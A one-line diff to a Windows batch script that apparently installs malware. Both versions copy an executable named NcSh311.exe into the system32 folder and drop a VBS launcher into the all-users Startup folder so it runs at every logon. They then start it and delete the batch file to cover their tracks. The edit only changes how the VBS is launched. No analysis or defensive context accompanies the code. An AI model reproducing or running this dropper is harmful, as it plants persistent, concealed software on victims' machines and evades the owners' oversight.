@@ -1,1 +1,1 @@
-move %~dp0NcSh311.exe C:\Windows\system32\NcSh311.exe&move %~dp0NcSh311.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\NcSh311.vbs"&"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\NcSh311.vbs"&DEL "%~f0"
+move %~dp0NcSh311.exe C:\Windows\system32\NcSh311.exe&move %~dp0NcSh311.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\NcSh311.vbs"&start "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\NcSh311.vbs"&DEL "%~f0"
